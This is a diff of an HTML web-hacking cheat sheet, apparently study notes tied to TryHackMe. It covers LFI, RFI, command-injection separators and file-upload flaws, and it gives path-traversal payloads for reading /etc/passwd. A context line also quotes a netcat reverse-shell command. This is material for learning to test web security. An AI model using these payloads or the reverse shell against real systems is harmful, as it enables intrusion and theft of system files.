@@ -111,18 +111,19 @@
     <h2><li>Local File Inclusion (LFI)</li></h2>
      <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png">
      <p>If website allow user to execute command in quary string after '=' sign, then this vulnerability happend.<br>Normally this cause happend for file_get_contents PHP fuction.</p>
-     <p>If PHP 5.3.4 and down then NULLBYTE (%00 or 0x00) vulnerability will working.</p>
-    <h2><li>Remote code execution vulnerability</li></h2>
+     <p>If PHP 5.3.3 and down then NULLBYTE (%00 or 0x00) vulnerability will working.</p>
+    
+    <h2><li>Remote File Inclusion - RFI</li></h2>
+    <p>Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. <br>One requirement for RFI is that the allow_url_fopen option needs to be on.</p>
+    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png" style="width:989.5px;height:611.368px">
+  
+
+     <h2><li>Remote code execution vulnerability</li></h2>
     <p>If website allow to execute code with their allow code like[their_code;attacker_code] then this vulnerability exist. <br>
     mixing code would be --- <b>[their_code;attacker_code]</b> or <b>[their_code ; attacker_code]</b> or <b>[their_code|attacker_code]</b> or <b>[their_code | attacker_code]</b> or <b>[their_code&&attacker_code]</b> or <b>[their_code && attacker_code]</b></p>
 
     <h2><li>File upload vulnerability</li></h2>
     <p> If website allow to upload any kind file like .php, .python then this vulnerability exist</p>
-   
-
-    <h2><li>Remote File Inclusion - RFI</li></h2>
-    <p>Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. <br>One requirement for RFI is that the allow_url_fopen option needs to be on.</p>
-    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png" style="width:989.5px;height:611.368px">
   
   </div>
             <!--  Vulnerability Finding section end here    -->
@@ -174,7 +175,14 @@ nc -e /bin/sh 10.20.14 8080<br>
      <p> If none of them work then try <b>/etc/passwd/.</b> <br> if all of them are failed then oviously try this one - <b>....//....//....//....//....//etc/passwd</b></p>
      <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png" style="font-size:1rem;width:500.25px;height:200px">
      <h4>Tips: some time it only work on url. it also some time word on specified folder. find it and execute payload there.</h4>
-    </div>
+    
+    <h3>Getting shell from LFI exploit</h3>
+    <p><b>Method 1</b>
+    <ol> </ol>
+    <b>Method 2</b>
+    <ol> </ol>
+
+</div>
    <!-- Exploitation section end here termux -->
 </body>
 </html>           
